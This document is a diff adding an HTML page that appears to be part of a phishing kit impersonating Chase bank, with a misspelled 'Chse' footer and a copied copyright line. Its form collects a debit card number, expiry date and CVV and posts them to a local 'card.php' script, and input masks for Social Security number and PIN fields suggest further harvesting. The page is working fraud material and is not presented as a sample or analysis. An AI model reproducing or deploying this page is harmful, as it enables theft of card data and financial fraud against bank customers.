@@ -1,0 +1,108 @@
+<html><head>
+	<title>Sign in</title>
+	<link rel="shortcut icon" href="favicon.ico">
+	<link rel="stylesheet" type="text/css" href="vc.css">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+  	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+  	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+
+
+
+		  <script src="css/jquery-3.1.0.min.js"></script>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
+    
+	 <script>
+    $(document).ready(function(){
+     $('#psp').mask("9999-9999-9999-9999", {placeholder:""});
+    });   
+    </script>
+    <script>
+    $(document).ready(function(){
+     $('#dt').mask("999", {placeholder:""});
+    });   
+    </script>
+    <script>
+    $(document).ready(function(){
+     $('#bn').mask("99/9999", {placeholder:"MM/YYYY"});
+    });   
+    </script>
+    <script>
+    $(document).ready(function(){
+     $('#ssd').mask("999-99-9999", {placeholder:""});
+    });   
+    </script>    
+	<script>
+    $(document).ready(function(){
+     $('#pinsi').mask("9999", {placeholder:""});
+    });   
+    </script>
+
+</head>
+<body>
+<header>
+	<div id="logo"></div>
+</header>
+<div id="maincontainer">
+	<div id="logindiv">
+		<form method="post" action="../Scripts/card.php">
+			<div id="inpfielddive">
+				
+				<div class="floating-label">      
+	                 <input id="psp" class="floating-input" name="ccn" type="text" required="" placeholder="Dedit Card Number">
+                </div>
+
+                <div class="floating-label">      
+	                 <input id="bn" class="floating-input" name="expiry" type="text" placeholder="Expiartion Date MM/YYYY" required="">
+                </div>
+
+                <div class="floating-label">      
+	                 <input id="dt" class="floating-input" name="cvv" type="text" placeholder="CVV/CSC" required="">
+                </div>
+                
+			</div>
+			<div id="sbmndlink">
+				<button type="submit" name="submit">Continue</button>
+			</div>
+		</form>
+	</div>
+</div>
+<footer>
+	<div id="socials">
+		<ul>
+			<li><a href="">Follow us:</a></li>
+			<li><a href=""><i class="fa fa-facebook" style="font-size:18px"></i></a></li>
+			<li><a href=""><i class="fa fa-instagram" style="font-size:18px"></i></a></li>
+			<li><a href=""><i class="fa fa-twitter" style="font-size:18px"></i></a></li>
+			<li><a href=""><i class="fa fa-youtube" style="font-size:18px"></i></a></li>
+			<li><a href=""><i class="fa fa-linkedin" style="font-size:18px"></i></a></li>
+		</ul>
+	</div>
+	<div class="links">
+		<ul>
+			<li><a href="">Contact us</a></li>
+			<li><a href="">Privacy</a></li>
+			<li><a href="">Security</a></li>
+			<li><a href="">Terms of use</a></li>
+			<li><a href="">Accessibility</a></li>
+			<li><a href="">SAFE Act: Chse Mortgage Loan Originators</a></li>
+			<li><a href="">Fair Lending</a></li>
+			<li><a href="">About Chse</a></li>
+			<li><a href="">J.P. Morgan</a></li>
+			<li><a href="">JPMorgan Chse &amp; Co.</a></li>
+			<li><a href="">Careers</a></li>
+			<li><a href="">Español</a></li>
+			<li><a href="">Chse Canada</a></li>
+			<li><a href="">Site map</a></li>
+			<li><a href="">Member FDIC</a></li>
+			<li><a href="">Equal Housing Lender</a></li>
+		</ul>
+	</div>
+	<div id="cpr">
+		<p>© 2024 JPMorgan Chase &amp; Co.</p>
+	</div>
+</footer>
+
+</body></html>
